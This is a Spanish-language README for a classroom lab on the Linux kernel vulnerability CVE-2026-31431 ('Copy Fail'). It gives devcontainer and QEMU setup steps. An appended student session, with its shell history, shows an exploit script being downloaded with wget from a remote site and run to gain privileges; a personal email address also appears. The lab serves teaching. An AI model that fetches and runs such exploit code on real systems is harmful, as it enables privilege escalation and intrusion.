# Copy Fail Lab — CVE-2026-31431 (v2)

Devcontainer reproducible para experimentar con la vulnerabilidad **Copy Fail**
(CVE-2026-31431) en un kernel Linux 6.12 controlado dentro de QEMU.

Esta v2 incorpora todas las correcciones aprendidas en una sesión de debugging
exhaustiva: opciones de kernel necesarias para que arranque, configuración
correcta de BusyBox estático, rutas dinámicas independientes del nombre del repo,
y dependencias Ubuntu 24.04 corregidas.

---

## Inicio rápido para el estudiante

1. Abre un Codespace desde este repo.
   ```bash
   #CONFIGURACION DE EJEMPLO!!!!!!!!!!!
   apt update
   apt install gh
   
   gh api user --jq '"\(.name) → \(.email // .login)"'
   
   git config --global user.name "Jonathan E. Tito O."
   git config --global user.email "jonathantito@users.noreply.github.com"
   git config --global --add safe.directory /workspaces/copy-fail-challenge-1
   make setup
   ```
3. Configura tu identidad git:
   ```bash
   git config --global user.name "Tu Nombre"
   git config --global user.email "tu@correo.com"
   ```
4. Ejecuta:
   ```bash
   make setup    # descarga kernel + arma rootfs (~5 min)
   make qemu     # arranca la VM vulnerable
   ```

Para salir de QEMU: `Ctrl+A` luego `X`.

---

## Configuración inicial del docente (una sola vez)

### 1. Subir este repo a GitHub

```bash
cd copyfail-v2
git init && git add -A && git commit -m "initial"
git branch -M main
gh repo create TU-ORG/copy-fail-lab --public --source=. --push
```

### 2. Marcarlo como Template

GitHub → tu repo → Settings → marcar `Template repository`.

### 3. Editar `.devcontainer/devcontainer.json`

Cambia el valor `KERNEL_REPO`:
```json
"KERNEL_REPO": "TU-ORG/copy-fail-lab"
```

Commit y push.

### 4. Disparar el workflow del kernel

GitHub → Actions → `Build Vulnerable Kernel` → Run workflow.
Tarda ~25 min en los servidores de GitHub (no en tu Codespace).
Al terminar crea un Release con el `bzImage_vuln` listo para descarga.

### 5. Verificar

Tu repo → Releases → debe aparecer `kernel-v6.12-vuln` con tres archivos
adjuntos. Los estudiantes ahora pueden hacer `make setup` y descarga en 2 min.

---

## Estructura del repo

```
.
├── .devcontainer/
│   ├── Dockerfile             ← Ubuntu 24.04 + deps verificadas
│   └── devcontainer.json      ← sin rutas hardcodeadas
├── .github/workflows/
│   └── build-kernel.yml       ← compila kernel y crea Release
├── scripts/
│   ├── 00_welcome.sh
│   ├── 01_fetch_kernel.sh     ← descarga del Release
│   ├── 02_build_kernel.sh     ← fallback: compila desde fuente
│   ├── 03_build_rootfs.sh     ← BusyBox estático + initramfs
│   └── 04_run_qemu.sh
├── Makefile
└── README.md
```

---

## Comandos disponibles

| Comando | Acción |
|---|---|
| `make setup` | Descarga kernel + arma rootfs (~5 min) |
| `make qemu` | Arranca la VM vulnerable |
| `make info` | Muestra el estado del ambiente |
| `make rootfs` | Reconstruye solo el initramfs |
| `make fetch-kernel` | Solo descarga el bzImage del Release |
| `make build-kernel` | Compila kernel desde fuente (~25 min) |
| `make clean` | Borra builds (mantiene fuentes) |
| `make clean-all` | Borra todo |

---

## Recursos del CVE

- Write-up técnico: https://xint.io/blog/copy-fail-linux-distributions
- Sitio del CVE: https://copy.fail
- PoC oficial: https://github.com/theori-io/copy-fail-CVE-2026-31431

---

## Lecciones aprendidas (referencia para futuras versiones)

Esta v2 incorpora los siguientes fixes respecto a la v1:

- `hexdump` → `bsdextrautils` en Ubuntu 24.04
- `bzip2` agregado al Dockerfile (lo necesita BusyBox)
- Eliminado el `mounts` con ruta hardcodeada en `devcontainer.json`
- Todos los scripts detectan workspace con `SCRIPT_DIR` dinámico
- Kernel: agregadas opciones críticas `BINFMT_ELF`, `BINFMT_SCRIPT`, `RD_GZIP`
- Kernel: agregada dep `CRYPTO_AEAD` antes de `CRYPTO_AUTHENCESN`
- BusyBox: reemplazado `scripts/config` (no existe) por `sed`
- BusyBox: eliminado `olddefconfig` (no existe en BusyBox)
- BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
- BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
- Workflow Actions: greps de verificación con `|| echo`, tolerantes



respuestas
# ¿Qué kernel corre?
uname -r
6.12.0
lsmod | grep alg
-sh: lsmod: not found

# ¿Cuál es tu identidad actual? (debe ser student, NO root)
id

$ id
uid=1001(student) gid=1001(student) groups=1001(student)
~ $ who ami
BusyBox v1.38.0.git (2026-05-11 12:48:19 UTC) multi-call binary.

Usage: who [-aH]

Show who is logged on

        -a      Show all
        -H      Print column headers
~ $ whoami
student
cat /proc/modules | grep algif
cat: can't open '/proc/modules': No such file or directory

wget https://copy.fail/exp -O copy_fail_exp.py
Resolving copy.fail (copy.fail)... 216.150.16.193, 216.150.1.193
Connecting to copy.fail (copy.fail)|216.150.16.193|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: 'copy_fail_exp.py'

copy_fail_exp.py            [ <=>                           ]     731  --.-KB/s    in 0s      

2026-05-11 13:45:54 (35.8 MB/s) - 'copy_fail_exp.py' saved [731]
chmod +x copy_fail_exp.py
python3 copy_fail_exp.py

    1  apt update
    2  apt install gh
    3  gp api user --jq '"\(.name) → \(.email // .login)"'
    4  gh api user --jq '"\(.name) → \(.email // .login)"'
    5  git config --global user.name "israelfarfan992-spec"
    6  git config --global user.email "israelfarfan992@gmail.com"
    7  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    8  make setup
    9  make qemu
   10  apt install -y file
   11  make qemu
   12  make setup
   13  make qemu
   14  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   15  make qemu
   16  grep -n "qemu-system" Makefile
   17  cat Makefile
   18  cat scripts/04_run_qemu.sh
   19  vim scripts/04_run_qemu.sh
   20  make qemu
   21  cat scripts/04_run_qemu.sh
   22  vim scripts/04_run_qemu.sh
   23  make qemu
   24  wget https://copy.fail/exp -O copy_fail_exp.py
   25  id
   26  python3 copy_fail_exp.p
   27  wget https://copy.fail/exp -O copy_fail_exp.py
   28  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   29  wget https://copy.fail/exp -O copy_fail_exp.py
   30  chmod +x copy_fail_exp.py
   31  python3 copy_fail_exp.py
   32  history
   root@codespaces-8a0d6d:/workspaces/copy-fail-challenge-B# history
    1  apt update
    2  apt install gh
    3  gp api user --jq '"\(.name) → \(.email // .login)"'
    4  gh api user --jq '"\(.name) → \(.email // .login)"'
    5  git config --global user.name "israelfarfan992-spec"
    6  git config --global user.email "israelfarfan992@gmail.com"
    7  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    8  make setup
    9  make qemu
   10  apt install -y file
   11  make qemu
   12  make setup
   13  make qemu
   14  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   15  make qemu
   16  copy_fail_exp.py
   17  histoty
   18  history